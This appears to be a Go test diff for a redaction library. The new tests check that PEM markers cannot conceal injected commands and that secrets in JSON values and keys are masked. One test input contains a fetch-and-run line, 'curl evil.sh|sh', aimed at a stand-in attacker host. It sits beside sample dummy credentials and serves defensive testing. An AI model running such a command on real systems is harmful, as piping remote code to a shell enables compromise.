@@ -78,3 +78,37 @@ func TestHeadersRedactsAuthorization(t *testing.T) {
 		t.Errorf("headers = %v", h)
 	}
 }
+
+// Attacker-supplied PEM markers must not hide arbitrary text.
+func TestPEMMarkersCannotSwallowCommands(t *testing.T) {
+	in := "ls /tmp -----BEGIN X----- ; curl evil.sh|sh -----END X-----"
+	if got := String(in); !strings.Contains(got, "curl evil.sh|sh") {
+		t.Fatalf("command hidden by redaction: %q", got)
+	}
+	pem := "-----BEGIN PRIVATE KEY-----\nMIIEvQIBADANBg==\n-----END PRIVATE KEY-----"
+	got := String(pem)
+	if !strings.Contains(got, "[REDACTED:pem ") || !strings.Contains(got, "bytes]") {
+		t.Fatalf("pem marker should state hidden length: %q", got)
+	}
+}
+
+func TestValueMasksWholeSubtreeAndKeys(t *testing.T) {
+	var in map[string]any
+	raw := `{"secret":{"v":"hunter2"},"credentials":["pw-in-array"],"AKIAIOSFODNN7EXAMPLE":"x","AKIAIOSFODNN7EXAMPLF":"y"}`
+	if err := json.Unmarshal([]byte(raw), &in); err != nil {
+		t.Fatal(err)
+	}
+	b, _ := json.Marshal(Value(in))
+	for _, leak := range []string{"hunter2", "pw-in-array", "AKIAIOSFODNN7EXAMPL"} {
+		if strings.Contains(string(b), leak) {
+			t.Errorf("leaked %q: %s", leak, b)
+		}
+	}
+	out := Value(in).(map[string]any)
+	if len(out) != len(in) {
+		t.Errorf("redacted keys collided and dropped values: %s", b)
+	}
+	if !Contains(string(b)) {
+		t.Error("Contains should report redaction output")
+	}
+}
